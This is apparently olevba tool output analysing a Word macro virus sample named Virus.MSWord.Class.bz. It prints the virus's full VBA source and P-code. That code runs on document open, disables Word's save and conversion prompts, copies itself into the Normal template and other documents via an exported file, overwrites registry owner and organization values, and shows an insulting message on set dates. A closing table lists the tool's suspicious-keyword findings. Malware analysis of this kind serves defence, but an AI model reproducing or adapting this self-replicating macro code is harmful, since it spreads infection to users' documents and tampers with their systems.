olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Harry H.9/1/01 2:52:10 AMDok1.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Harry H.9/1/01 2:52:10 AMDok1.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Harry H.9/1/01 2:52:10 AMDok1.doc
Const REG_SZ As Long = 1
'Harry H.9/1/01 2:52:10 AMDok1.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Harry H.9/1/01 2:52:10 AMDok1.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Harry H.9/1/01 2:52:10 AMDok1.doc
Sub AutoOpen()
'Harry H.9/1/01 2:52:10 AMDok1.doc
On Error GoTo out
'Harry H.9/1/01 2:52:10 AMDok1.doc
Options.VirusProtection = True
'Harry H.9/1/01 2:52:10 AMDok1.doc
Options.SaveNormalPrompt = True
'Harry H.9/1/01 2:52:10 AMDok1.doc
Options.ConfirmConversions = True
'Harry H.9/1/01 2:52:10 AMDok1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Harry H.9/1/01 2:52:10 AMDok1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt > 70 And ad > 0 Then GoTo out
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt < 70 Then
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Harry H.9/1/01 2:52:10 AMDok1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Harry H.9/1/01 2:52:10 AMDok1.doc
End If
'Harry H.9/1/01 2:52:10 AMDok1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Harry H.9/1/01 2:52:10 AMDok1.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Harry H.9/1/01 2:52:10 AMDok1.doc
With host.codemodule
'Harry H.9/1/01 2:52:10 AMDok1.doc
    For x = 1 To 16
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .deletelines 1
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Next x
'Harry H.9/1/01 2:52:10 AMDok1.doc
End With
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt < 70 Then
'Harry H.9/1/01 2:52:10 AMDok1.doc
    With host.codemodule
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline 1, "Sub AutoClose()"
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline 91, "Sub ToolsMacro()"
'Harry H.9/1/01 2:52:10 AMDok1.doc
    For x = 70 To 81
'Harry H.9/1/01 2:52:10 AMDok1.doc
        .deletelines 62
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Next x
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline 35, "    For x = 1 To 4"
'Harry H.9/1/01 2:52:10 AMDok1.doc
    End With
'Harry H.9/1/01 2:52:10 AMDok1.doc
End If
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt < 70 Then
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegCloseKey(k)
'Harry H.9/1/01 2:52:10 AMDok1.doc
End If
'Harry H.9/1/01 2:52:10 AMDok1.doc
With host.codemodule
'Harry H.9/1/01 2:52:10 AMDok1.doc
    For x = 2 To 104 Step 2
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Next x
'Harry H.9/1/01 2:52:10 AMDok1.doc
End With
'Harry H.9/1/01 2:52:10 AMDok1.doc
out:
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Harry H.9/1/01 2:52:10 AMDok1.doc
End Sub
'Harry H.9/1/01 2:52:10 AMDok1.doc
Sub ViewVBCode()
'Harry H.9/1/01 2:52:10 AMDok1.doc
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7946 bytes
' Line #0:
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #1:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #2:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #3:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #4:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #5:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ (As Long)
' Line #7:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #8:
' 	Dim (Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #9:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #10:
' 	Dim (Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #11:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #12:
' 	FuncDefn (Sub AutoOpen())
' Line #13:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #14:
' 	OnError out 
' Line #15:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #16:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #18:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #20:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #21:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #22:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #23:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #24:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #25:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #26:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #28:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #31:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #32:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #34:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #38:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #40:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #41:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #42:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #43:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #46:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #47:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #48:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #52:
' 	EndWith 
' Line #53:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #54:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #55:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #56:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #57:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #58:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #60:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #61:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #62:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #63:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #64:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #65:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #66:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #68:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #70:
' 	EndWith 
' Line #71:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #74:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #75:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #76:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x0029 "Software\Microsoft\Windows\CurrentVersion"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #77:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #78:
' 	Ld k 
' 	LitStr 0x000F "RegisteredOwner"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0012 "VicodinES /CB /TNN"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #79:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #80:
' 	Ld k 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0019 "-(Dr. Diet Mountain Dew)-"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #81:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #82:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #83:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #86:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #87:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #89:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #90:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #91:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #92:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #94:
' 	EndWith 
' Line #95:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #96:
' 	Label out 
' Line #97:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #98:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #99:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #100:
' 	EndSub 
' Line #101:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #102:
' 	FuncDefn (Sub ViewVBCode())
' Line #103:
' 	QuoteRem 0x0000 0x0021 "Harry H.9/1/01 2:52:10 AMDok1.doc"
' Line #104:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

